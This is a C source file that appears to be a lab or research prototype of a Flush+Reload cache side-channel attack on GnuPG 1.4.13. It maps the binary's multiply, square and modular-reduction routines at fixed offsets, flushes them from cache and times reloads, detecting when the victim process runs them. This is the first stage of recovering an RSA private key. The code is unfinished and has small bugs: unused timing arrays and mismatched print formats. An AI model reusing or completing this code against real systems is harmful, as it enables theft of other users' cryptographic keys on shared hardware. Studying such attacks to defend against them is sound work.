#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#ifdef __linux__
#include <sched.h>
#endif

typedef uint8_t byte;

const unsigned int THRESHHOLD = 100;
const unsigned int MUL_OFFSET = 0x8f67d;
const unsigned int SQR_OFFSET = 0x8fc89;
const unsigned int MOD_OFFSET = 0x8ed5c;

static inline void maccess(void *p)
{
    asm volatile("movq (%0), %%rax\n"
                 :
                 : "c"(p)
                 : "rax");
}

static inline void flush(void *p)
{
    asm volatile("clflush 0(%0)\n"
                 :
                 : "c"(p)
                 : "rax");
}

static inline uint64_t rdtsc()
{
    uint64_t a, d;
    asm volatile("mfence");
    asm volatile("rdtsc"
                 : "=a"(a), "=d"(d));
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

static inline int memaccesstime(void *v) {
  int rv;
  asm volatile (
      "mfence\n"
      "lfence\n"
      "rdtscp\n"
      "mov %%eax, %%esi\n"
      "mov (%1), %%eax\n"
      "rdtscp\n"
      "clflush 0(%1)\n"
      "sub %%esi, %%eax\n"
      : "=&a" (rv): "r" (v): "ecx", "edx", "esi");
  return rv;
}

static inline uint64_t full_flush_reload_time(void *p)
{
    uint64_t start = rdtsc();
    maccess(p);
    uint64_t end = rdtsc();
    flush(p);
    return end - start;
}

void probe(const unsigned int threshhold)
{
    const unsigned long SLOTS = 20000;
    const unsigned long SLOT_TIME = 2500;
    unsigned long mul_timings[SLOTS];
    unsigned long sqr_timings[SLOTS];
    unsigned long mod_timings[SLOTS];
    /*
        Waiting for threshhold
    */
    int fd = open("../bin/gpg-1.4.13", O_RDONLY);
    if (fd == -1)
    {
        perror("Failed to open gpg-1.4.13");
    }
    byte *mul_fn_addr = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, MUL_OFFSET & ~(sysconf(_SC_PAGE_SIZE) - 1));
    byte *sqr_fn_addr = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, SQR_OFFSET & ~(sysconf(_SC_PAGE_SIZE) - 1));
    byte *mod_fn_addr = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, MOD_OFFSET & ~(sysconf(_SC_PAGE_SIZE) - 1));
    close(fd);
    if (mul_fn_addr == (void *)-1 || sqr_fn_addr == (void *)-1 || mod_fn_addr == (void *)-1)
    {
        perror("Failed to memory map the offsets of the functions in gpg");
    }
    printf("Scanning...\n");
    while (1)
    {
        uint64_t start_time = rdtsc();
        const uint64_t finish_time = start_time + SLOT_TIME;
        int mul_time = memaccesstime(mul_fn_addr);
        int sqr_time = memaccesstime(sqr_fn_addr);
        int mod_time = memaccesstime(mod_fn_addr);
        if (mul_time < threshhold || sqr_time < threshhold || mod_time < threshhold)
        {
            printf("Found threshhold! %lu %lu %lu\n", mul_time, sqr_time, mod_time);
            break;
        }
        while (start_time < finish_time)
        {
            start_time = rdtsc();
        }
    }
}

int main(int argc, char **argv)
{
    probe(THRESHHOLD);
    return 0;
}